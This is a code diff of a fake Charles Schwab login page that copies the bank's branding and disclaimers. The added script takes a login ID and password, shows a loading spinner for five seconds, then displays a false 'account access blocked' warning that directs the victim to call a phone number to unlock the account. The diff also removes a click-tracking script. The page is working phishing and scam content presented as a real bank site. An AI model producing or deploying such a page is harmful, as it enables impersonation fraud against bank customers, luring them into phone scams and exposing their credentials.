@@ -1,38 +1,79 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login | Charles Schwab</title>
-    <!-- Custom Style Sheet -->
     <link rel="stylesheet" href="css/zt1WMfQw72qM.css">
     <link rel="shortcut icon" href="images/l4mHJqxNUzDY.png" type="image/x-icon">
-<script async="" src="js/LZcZEmQDYHZG.js"></script></head>
+    <script async="" src="js/LZcZEmQDYHZG.js"></script>
+    <style>
+        /* Simple circular loader */
+        /* Smaller circular loader */
+.loader {
+    border: 4px solid transparent;
+    border-top: 4px solid #fff;
+    border-radius: 50%;
+    width: 20px; /* Reduced size */
+    height: 20px; /* Reduced size */
+    animation: spin 1s linear infinite;
+    display: none; /* Hidden by default */
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+
+        /* Styling the button and input box */
+        button {
+            position: relative;
+            padding: 10px 20px;
+            background-color: #006e99;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Prevent border-color change on hover */
+        .inputBox input {
+            border-color: #ccc;
+        }
+
+        /* Error border only after form submission */
+        .inputBox input.error {
+            border-color: red;
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
 <body>
     <div class="container">
-        <!-- NavBar  -->
         <nav>
             <img src="images/l4mHJqxNUzDY.png" alt="logo">
         </nav>
-    
-        <div class="information-bar">
 
-        </div>
-
-
-        <!-- Main section  -->
         <div class="main-login-section">
             <div class="login-wrapper">
                 <h1 class="login-title">Log in to Schwab</h1>
-                <div class="warning" id="hide">
-                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at    <a href="tel:+18337144077" onclick="trackClick()">+1(833)714-4077</a> to verify and unlock your account."
+                <div class="warning hidden" id="warningMessage">
+                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+18337144077" onclick="trackClick()">+1(833)714-4077</a> to verify and unlock your account."
                 </div>
-                <form class="login-form" action="https://www.chaserad.com/this.preventDefault()">
+                <form class="login-form" id="loginForm">
                     <label for="loginId">Login ID</label>
                     <div class="inputBox">
-                        <input type="text" id="loginId">
+                        <input type="text" id="loginId" required>
                     </div>
                     <label for="password">Password</label>
                     <div class="inputBox">
-                        <input type="password" id="password">
+                        <input type="password" id="password" required>
                         <img src="images/HBmRjCXy1lsp.png" id="hideShowBtn" class="hide" alt="">
                     </div>
                     <div class="rememberBox">
@@ -57,7 +98,10 @@
                             <option value="11: Object"> Watchlist </option>
                         </select>
                     </div>
-                    <button id="loginBtn">Log In</button>
+                    <button type="submit" id="loginBtn">
+                        <span id="loginText">Log In</span>
+                        <span class="loader" id="loader"></span>
+                    </button>
                 </form>
 
                 <p class="forgot-details">Forgot <a href="#">Login ID</a> or <a href="#">Password?</a></p>
@@ -65,99 +109,110 @@
                     <a href="#">New User?</a>
                     <span></span>
                     <select id="language-selector" class="language-dropdown">
-                        <option value="" selected="">
-                            English
-                        </option>
-                        <option value="">
-                            繁體
-                        </option>
-                        <option value="">
-                            简体
-                        </option>
+                        <option value="" selected="">English</option>
+                        <option value="">繁體</option>
+                        <option value="">简体</option>
                     </select>
                 </div>
             </div>
         </div>
 
-        <!-- Cards  -->
-        <div class="cards-wrapper">
-            <div class="card">
-                <img src="card-img-1.html" alt="">
-                <div class="content">
-                    <h1>Are you on track to save for retirement?</h1>
-                    <p>Find the right IRA for your needs and open an account today.                    </p>
-                    <a href="#">Learn more</a>
-                </div>
-            </div>
-            <div class="card">
-                <img src="card-img-2.html" alt="">
-                <div class="content">
-                    <h1>Invest in ideas you believe in.</h1>
-                    <p>Find new opportunities with 40+ customizable themes.</p>
-                    <a href="#">Explore Compay Investing Themes</a>
-                </div>
-            </div>
-            <div class="card">
-                <img src="card-img-3.html" alt="">
-                <div class="content">
-                    <h1>Introducing the Schwab Ultra-Short Income ETF ().</h1>
-                    <p>Our new ETF is designed for potential income, stability, and daily liquidity.</p>
-                    <a href="#">Explore SCUS</a>
-                </div>
-            </div>
+
+<!-- Cards  -->
+<div class="cards-wrapper">
+    <div class="card">
+        <img src="card-img-1.html" alt="">
+        <div class="content">
+            <h1>Are you on track to save for retirement?</h1>
+            <p>Find the right IRA for your needs and open an account today.                    </p>
+            <a href="#">Learn more</a>
         </div>
-
-        <!-- important Information section -->
-        <div class="important-info">
-            <p><span>Important information about our relationship with you:</span> <a href="#" style="text-decoration: none;">Client Relationship Summaries</a></p>
-            <p>Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at schwab.com/transparency. <a href="#" style="text-decoration: none;">Schwab.com/transparency.</a></p>
+    </div>
+    <div class="card">
+        <img src="card-img-2.html" alt="">
+        <div class="content">
+            <h1>Invest in ideas you believe in.</h1>
+            <p>Find new opportunities with 40+ customizable themes.</p>
+            <a href="#">Explore Compay Investing Themes</a>
         </div>
+    </div>
+    <div class="card">
+        <img src="card-img-3.html" alt="">
+        <div class="content">
+            <h1>Introducing the Schwab Ultra-Short Income ETF ().</h1>
+            <p>Our new ETF is designed for potential income, stability, and daily liquidity.</p>
+            <a href="#">Explore SCUS</a>
+        </div>
+    </div>
+</div>
 
-        <!-- Footer  -->
-        <footer>
-            <div class="links-wrapper">
-                <a href="#">Schwab Safe®</a>
-                <a href="#"> The Schwab Security Guarantee</a>
-                <a href="#">Schwab Homepage</a>
-            </div>
-            <p style="color: #006e99; font-size: 12px;">Web Broweser Information</p>
-            <div style=" border: 1px solid #333; padding: 20px; font-weight: bold; text-align: center; color: #666;">
-                Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value
-            </div>
-            <p class="footer-desc">Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
-            <p class="footer-desc">Check the background of this firm or one of its investment professionals on <a href="#">FINRA's BrokerCheck</a>.</p>
-            <p class="footer-desc">The Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Schwab & Co., Inc. (<a href="#">member </a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
-            <p class="footer-desc">This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a href="#">non-U.S. residents.</a></p>
-            <p class="footer-desc" style="margin: 20px 0">© 2024 Schwab & Co., Inc, All rights reserved. Member . Unauthorized access is prohibited. Usage will be monitored.(0124-3J4J)</p>
-        </footer>
+<!-- important Information section -->
+<div class="important-info">
+    <p><span>Important information about our relationship with you:</span> <a href="#" style="text-decoration: none;">Client Relationship Summaries</a></p>
+    <p>Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at schwab.com/transparency. <a href="#" style="text-decoration: none;">Schwab.com/transparency.</a></p>
+</div>
 
+<!-- Footer  -->
+<footer>
+    <div class="links-wrapper">
+        <a href="#">Schwab Safe®</a>
+        <a href="#"> The Schwab Security Guarantee</a>
+        <a href="#">Schwab Homepage</a>
+    </div>
+    <p style="color: #006e99; font-size: 12px;">Web Broweser Information</p>
+    <div style=" border: 1px solid #333; padding: 20px; font-weight: bold; text-align: center; color: #666;">
+        Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value
+    </div>
+    <p class="footer-desc">Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
+    <p class="footer-desc">Check the background of this firm or one of its investment professionals on <a href="#">FINRA's BrokerCheck</a>.</p>
+    <p class="footer-desc">The Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Schwab & Co., Inc. (<a href="#">member </a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
+    <p class="footer-desc">This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a href="#">non-U.S. residents.</a></p>
+    <p class="footer-desc" style="margin: 20px 0">© 2024 Schwab & Co., Inc, All rights reserved. Member . Unauthorized access is prohibited. Usage will be monitored.(0124-3J4J)</p>
+</footer>
     </div>
 
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
+            var loginId = document.getElementById('loginId').value;
+            var password = document.getElementById('password').value;
+            var loginBtn = document.getElementById('loginBtn');
+            var loader = document.getElementById('loader');
+            var loginText = document.getElementById('loginText');
+            var warningMessage = document.getElementById('warningMessage');
+            var loginIdInput = document.getElementById('loginId');
+            var passwordInput = document.getElementById('password');
 
-    <!-- Custom Script  -->
-    <script src="js/RawAOrTM9qn9.js"></script>
-  
-     <script>
-        function trackClick() {
-            var phone_number = '+1(855)532-0687';
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST.html", "update_click_count.html", true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            xhr.send("phone_number=" + encodeURIComponent(phone_number));
-        }
+            // Reset any previous error highlights
+            loginIdInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+
+            // If login ID or password is empty, highlight the fields and show an alert
+            if (!loginId || !password) {
+                if (!loginId) {
+                    loginIdInput.classList.add('error');
+                }
+                if (!password) {
+                    passwordInput.classList.add('error');
+                }
+                alert("Please fill in both Login ID and Password.");
+                return;
+            }
+
+            // Hide the login text and show the loader
+            loginText.style.display = 'none'; // Hide the text
+            loader.style.display = 'inline-block'; // Show loader
+            loginBtn.disabled = true; // Disable the login button
+
+            // Wait for 5 seconds before showing the message and hiding the form
+            setTimeout(function() {
+                // Hide form and show the warning message
+                document.getElementById('loginForm').classList.add('hidden');
+                warningMessage.classList.remove('hidden');
+                loader.style.display = 'none'; // Hide loader
+            }, 5000); // 5 seconds
+        });
     </script>
-	
-	<!-- Begin Web-Stat code v 7.0 -->
-<span id="wts2191321"></span>
-<script>var wts=document.createElement('script');wts.async=true;
-wts.src='https://app.ardalio.com/log7.js';document.head.appendChild(wts);
-wts.onload = function(){ wtslog7(2191321,1); };
-</script><noscript><a href="https://www.web-stat.com">
-<img src="https://app.ardalio.com/7/1/2191321.png" 
-alt="Web-Stat web traffic analysis"></a></noscript>
-<!-- End Web-Stat code v 7.0 -->
-
-
-
-</body></html>
+</body>
+</html>
